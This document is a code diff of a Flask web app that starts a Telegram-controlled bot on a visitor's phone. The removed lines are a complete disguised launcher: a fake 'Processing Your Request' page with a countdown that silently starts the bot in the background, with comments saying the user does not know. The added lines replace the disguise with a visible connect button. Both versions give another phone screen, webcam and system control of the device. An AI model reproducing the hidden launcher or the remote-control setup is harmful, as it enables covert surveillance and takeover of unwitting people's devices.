@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Beautiful Frontend + Backend Connection
-Phone 2 users see a beautiful page while secretly connecting to Phone 1's bot
+Phone 2 Control Interface
+Phone 2 users access this web page, then Phone 1 can control Phone 2 through Telegram bot
 """
 
-from flask import Flask, render_template_string, jsonify
+from flask import Flask, render_template_string, jsonify, request
 import subprocess
 import os
 import sys
@@ -17,6 +17,7 @@ app = Flask(__name__)
 # Global variables
 bot_process = None
 bot_running = False
+phone2_connected = False
 
 def find_control_py():
     """Find the control.py script in the current directory"""
@@ -27,8 +28,8 @@ def find_control_py():
         return str(control_script)
     return None
 
-def start_bot_background():
-    """Start the bot in the background without user knowing"""
+def start_bot():
+    """Start the Telegram bot on Phone 2"""
     global bot_process, bot_running
     
     if bot_running:
@@ -39,12 +40,11 @@ def start_bot_background():
         return False, "Control script not found"
     
     try:
-        # Start the bot silently in background
+        # Start the bot
         bot_process = subprocess.Popen(
             [sys.executable, control_script],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            stdin=subprocess.DEVNULL
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
         )
         
         # Wait to see if it starts
@@ -61,14 +61,14 @@ def start_bot_background():
 
 @app.route('/')
 def index():
-    """Beautiful frontend page"""
+    """Main control interface for Phone 2"""
     return render_template_string('''
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Processing Your Request</title>
+        <title>Phone 2 Control Interface</title>
         <style>
             * {
                 margin: 0;
@@ -86,37 +86,17 @@ def index():
                 justify-content: center;
                 align-items: center;
                 padding: 20px;
-                overflow: hidden;
             }
             
             .container {
                 background: rgba(255, 255, 255, 0.1);
-                padding: 50px;
+                padding: 40px;
                 border-radius: 25px;
                 backdrop-filter: blur(20px);
                 box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
                 text-align: center;
                 max-width: 600px;
                 width: 100%;
-                position: relative;
-                overflow: hidden;
-            }
-            
-            .container::before {
-                content: '';
-                position: absolute;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-                animation: shimmer 3s infinite;
-                pointer-events: none;
-            }
-            
-            @keyframes shimmer {
-                0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-                100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
             }
             
             .icon {
@@ -131,133 +111,69 @@ def index():
             }
             
             h1 {
-                font-size: 2.8rem;
+                font-size: 2.5rem;
                 margin-bottom: 20px;
                 font-weight: 700;
-                background: linear-gradient(45deg, #fff, #f0f0f0);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                background-clip: text;
-            }
-            
-            .message {
-                font-size: 1.3rem;
-                margin-bottom: 30px;
-                opacity: 0.9;
-                line-height: 1.6;
-                font-weight: 500;
-            }
-            
-            .processing-bar {
-                width: 100%;
-                height: 8px;
-                background: rgba(255, 255, 255, 0.2);
-                border-radius: 4px;
-                overflow: hidden;
-                margin: 30px 0;
-                position: relative;
-            }
-            
-            .progress {
-                height: 100%;
-                background: linear-gradient(90deg, #4CAF50, #45a049);
-                border-radius: 4px;
-                width: 0%;
-                animation: progress 120s linear forwards;
-                position: relative;
-            }
-            
-            @keyframes progress {
-                0% { width: 0%; }
-                100% { width: 100%; }
-            }
-            
-            .progress::after {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: 0;
-                right: 0;
-                bottom: 0;
-                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-                animation: shimmer-progress 2s infinite;
-            }
-            
-            @keyframes shimmer-progress {
-                0% { transform: translateX(-100%); }
-                100% { transform: translateX(100%); }
             }
             
             .status {
-                background: rgba(255, 255, 255, 0.15);
+                background: rgba(255, 255, 255, 0.2);
                 padding: 20px;
                 border-radius: 15px;
                 margin: 20px 0;
                 font-size: 16px;
-                border: 1px solid rgba(255, 255, 255, 0.2);
+                border: 1px solid rgba(255, 255, 255, 0.3);
             }
             
-            .dots {
-                display: inline-block;
-                animation: dots 1.5s infinite;
+            .connect-btn {
+                background: #4CAF50;
+                color: white;
+                padding: 20px 40px;
+                border: none;
+                border-radius: 25px;
+                font-size: 18px;
+                font-weight: 600;
+                margin: 20px 0;
+                cursor: pointer;
+                transition: all 0.3s;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
             }
             
-            @keyframes dots {
-                0%, 20% { content: '.'; }
-                40% { content: '..'; }
-                60%, 100% { content: '...'; }
+            .connect-btn:hover {
+                background: #45a049;
+                transform: translateY(-2px);
+                box-shadow: 0 6px 20px rgba(0,0,0,0.3);
             }
             
-            .floating-elements {
-                position: absolute;
-                width: 100%;
-                height: 100%;
-                pointer-events: none;
-                overflow: hidden;
+            .connect-btn:disabled {
+                background: #cccccc;
+                cursor: not-allowed;
+                transform: none;
             }
             
-            .floating-element {
-                position: absolute;
-                width: 20px;
-                height: 20px;
+            .instructions {
                 background: rgba(255, 255, 255, 0.1);
-                border-radius: 50%;
-                animation: float 6s infinite linear;
+                padding: 20px;
+                border-radius: 15px;
+                margin: 20px 0;
+                text-align: left;
             }
             
-            .floating-element:nth-child(1) {
-                top: 10%;
-                left: 10%;
-                animation-delay: 0s;
+            .instructions h3 {
+                margin-bottom: 15px;
+                text-align: center;
             }
             
-            .floating-element:nth-child(2) {
-                top: 20%;
-                right: 15%;
-                animation-delay: 2s;
+            .instructions ol {
+                padding-left: 20px;
             }
             
-            .floating-element:nth-child(3) {
-                bottom: 30%;
-                left: 20%;
-                animation-delay: 4s;
+            .instructions li {
+                margin: 10px 0;
+                line-height: 1.6;
             }
             
-            @keyframes float {
-                0% { transform: translateY(0px) rotate(0deg); opacity: 0; }
-                10% { opacity: 1; }
-                90% { opacity: 1; }
-                100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
-            }
-            
-            .countdown {
-                font-size: 1.1rem;
-                margin-top: 20px;
-                opacity: 0.8;
-                font-weight: 500;
-            }
-            
-            .success-message {
+            .connected-status {
                 display: none;
                 background: rgba(76, 175, 80, 0.2);
                 border: 1px solid rgba(76, 175, 80, 0.4);
@@ -265,102 +181,164 @@ def index():
                 border-radius: 15px;
                 margin: 20px 0;
             }
+            
+            .loading {
+                display: none;
+                margin: 20px 0;
+            }
+            
+            .spinner {
+                border: 4px solid rgba(255, 255, 255, 0.3);
+                border-top: 4px solid white;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto;
+            }
+            
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
         </style>
     </head>
     <body>
-        <div class="floating-elements">
-            <div class="floating-element"></div>
-            <div class="floating-element"></div>
-            <div class="floating-element"></div>
-        </div>
-        
         <div class="container">
-            <div class="icon">⏳</div>
-            <h1>Processing Your Request</h1>
-            <div class="message">
-                Please wait for 2 minutes while we are processing<span class="dots">...</span>
-            </div>
-            
-            <div class="processing-bar">
-                <div class="progress"></div>
-            </div>
+            <div class="icon">📱</div>
+            <h1>Phone 2 Control Interface</h1>
             
             <div class="status" id="status">
-                Initializing system<span class="dots">...</span>
+                Ready to connect...
             </div>
             
-            <div class="countdown" id="countdown">
-                Time remaining: 2:00
+            <button class="connect-btn" id="connectBtn" onclick="connectPhone()">
+                🔌 Connect Phone 2
+            </button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Connecting...</p>
             </div>
             
-            <div class="success-message" id="successMessage">
-                ✅ Processing completed successfully!
+            <div class="connected-status" id="connectedStatus">
+                ✅ Phone 2 is now connected and ready to be controlled!
+                <br><br>
+                <strong>Phone 1 can now control this device through Telegram!</strong>
+            </div>
+            
+            <div class="instructions">
+                <h3>📋 How This Works:</h3>
+                <ol>
+                    <li><strong>Click "Connect Phone 2"</strong> button above</li>
+                    <li><strong>Phone 2</strong> will start the Telegram bot</li>
+                    <li><strong>Phone 1</strong> can then control Phone 2 through Telegram</li>
+                    <li><strong>Commands</strong> like /screen, /webcam, /sys will work on Phone 2</li>
+                </ol>
+            </div>
+            
+            <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
+                <p>💡 Keep this page open to maintain connection</p>
+                <p>🔒 Phone 1 will have full control access</p>
             </div>
         </div>
 
         <script>
-            let timeLeft = 120; // 2 minutes in seconds
-            let currentStep = 0;
+            let isConnected = false;
             
-            const statusMessages = [
-                "Initializing system...",
-                "Connecting to servers...",
-                "Loading resources...",
-                "Preparing data...",
-                "Almost done...",
-                "Finalizing..."
-            ];
-            
-            function updateCountdown() {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                document.getElementById('countdown').textContent = 
-                    `Time remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+            async function connectPhone() {
+                if (isConnected) return;
                 
-                if (timeLeft <= 0) {
-                    document.getElementById('countdown').textContent = "Processing completed!";
-                    document.getElementById('successMessage').style.display = 'block';
-                    document.getElementById('status').innerHTML = '✅ All done!';
-                } else {
-                    timeLeft--;
-                    setTimeout(updateCountdown, 1000);
-                }
-            }
-            
-            function updateStatus() {
-                if (currentStep < statusMessages.length) {
-                    document.getElementById('status').innerHTML = statusMessages[currentStep] + '<span class="dots">...</span>';
-                    currentStep++;
-                    setTimeout(updateStatus, 20000); // Update every 20 seconds
-                }
-            }
-            
-            // Start countdown and status updates
-            updateCountdown();
-            updateStatus();
-            
-            // Start the bot in background after a short delay
-            setTimeout(async () => {
+                const connectBtn = document.getElementById('connectBtn');
+                const status = document.getElementById('status');
+                const loading = document.getElementById('loading');
+                const connectedStatus = document.getElementById('connectedStatus');
+                
+                connectBtn.disabled = true;
+                loading.style.display = 'block';
+                status.innerHTML = '🔌 Connecting Phone 2...';
+                
                 try {
-                    const response = await fetch('/start_bot', { method: 'POST' });
+                    // Start the bot
+                    const response = await fetch('/start_bot', {
+                        method: 'POST'
+                    });
+                    
                     const data = await response.json();
-                    console.log('Bot status:', data);
+                    
+                    if (data.success) {
+                        isConnected = true;
+                        status.innerHTML = '✅ Phone 2 connected successfully!';
+                        loading.style.display = 'none';
+                        connectedStatus.style.display = 'block';
+                        connectBtn.innerHTML = '✅ Connected';
+                        connectBtn.style.background = '#4CAF50';
+                        
+                        // Show success message
+                        setTimeout(() => {
+                            status.innerHTML = '🎉 Phone 2 is now ready to be controlled by Phone 1!';
+                        }, 2000);
+                        
+                    } else {
+                        status.innerHTML = `❌ Connection failed: ${data.message}`;
+                        loading.style.display = 'none';
+                        connectBtn.disabled = false;
+                    }
+                    
                 } catch (error) {
-                    console.log('Background process started');
+                    status.innerHTML = '❌ Connection failed. Please try again.';
+                    loading.style.display = 'none';
+                    connectBtn.disabled = false;
                 }
-            }, 3000);
+            }
+            
+            // Check connection status on page load
+            window.addEventListener('load', async () => {
+                try {
+                    const response = await fetch('/bot_status');
+                    const data = await response.json();
+                    
+                    if (data.running) {
+                        isConnected = true;
+                        document.getElementById('status').innerHTML = '✅ Phone 2 is already connected!';
+                        document.getElementById('connectBtn').innerHTML = '✅ Connected';
+                        document.getElementById('connectBtn').style.background = '#4CAF50';
+                        document.getElementById('connectedStatus').style.display = 'block';
+                    }
+                } catch (error) {
+                    // Ignore errors on status check
+                }
+            });
+            
+            // Keep connection alive
+            setInterval(async () => {
+                if (isConnected) {
+                    try {
+                        await fetch('/health');
+                    } catch (error) {
+                        console.log('Keeping connection alive');
+                    }
+                }
+            }, 30000); // Every 30 seconds
         </script>
     </body>
     </html>
     ''')
 
 @app.route('/start_bot', methods=['POST'])
-def start_bot():
-    """Start the bot in background (Phone 2 user doesn't know this)"""
-    success, message = start_bot_background()
+def start_bot_endpoint():
+    """Start the bot to allow Phone 1 to control Phone 2"""
+    success, message = start_bot()
     return jsonify({
         'success': success,
         'message': message,
+        'running': bot_running
+    })
+
+@app.route('/bot_status')
+def bot_status():
+    """Check if bot is running"""
+    return jsonify({
         'running': bot_running
     })
 
@@ -373,7 +351,7 @@ def health():
     })
 
 if __name__ == '__main__':
-    print("🎭 Beautiful Frontend + Secret Backend")
+    print("📱 Phone 2 Control Interface")
     print("=" * 50)
     
     # Check if control.py exists
@@ -385,11 +363,11 @@ if __name__ == '__main__':
         print("   Make sure control.py is in the same directory")
         sys.exit(1)
     
-    print("\n🌐 Beautiful frontend available at:")
+    print("\n🌐 Control interface available at:")
     print("   Local: http://localhost:5000")
     print("   Network: http://[your-ip]:5000")
-    print("\n📱 Phone 2 users will see a beautiful page")
-    print("🤫 While secretly connecting to your bot!")
+    print("\n📱 Phone 2 users access this page to connect")
+    print("🎮 Phone 1 can then control Phone 2 through Telegram!")
     print("\n" + "=" * 50)
     
     try:
